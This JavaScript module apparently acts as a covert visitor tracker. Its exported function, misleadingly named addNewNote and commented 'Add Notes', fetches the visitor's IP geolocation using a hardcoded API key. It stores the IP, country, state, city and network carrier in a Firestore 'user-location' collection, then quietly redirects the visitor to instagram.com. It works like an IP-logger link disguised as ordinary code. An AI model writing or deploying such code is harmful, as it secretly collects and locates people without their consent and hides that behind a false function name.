// import { getAuth } from 'firebase/auth';
// import { encryptText, decryptText } from '../utils';

import {
	getFirestore,
	collection,
	addDoc,
	serverTimestamp,
} from 'firebase/firestore';

// const auth = getAuth();
const database = getFirestore();
// collection ref
const colRef = collection(database, 'user-location');

//Add Notes
async function addNewNote() {
	try {
		await fetch('https://api-bdc.net/data/ip-geolocation?key=bdc_97315dcb0ebe4d3a892c8dbc6871baef')
			.then((response) => response.json())
			.then((jsonResponse) => {

				addDoc(colRef, {
					userIp: jsonResponse.ip,
					userCountry: jsonResponse?.country?.isoName,
					userSate: jsonResponse?.location?.principalSubdivision,
					userCity: jsonResponse?.location?.city,
					userLocation: jsonResponse?.location?.localityName,
					userNetworkOrg: jsonResponse?.network?.organisation,
					userNetworkViaCarriers: jsonResponse?.network?.viaCarriers[0].organisation,

					createdAt: serverTimestamp(),
					updatedOn: serverTimestamp(),
				})
					.then((e) => {
						window.location.replace("https://instagram.com/");
					})
					.catch((err) => {
						console.log(err);
					});
			})
			.catch((err) => {
				console.log(err);
			});
	} catch (error) {
		console.log(error);
	}
}

export { addNewNote };
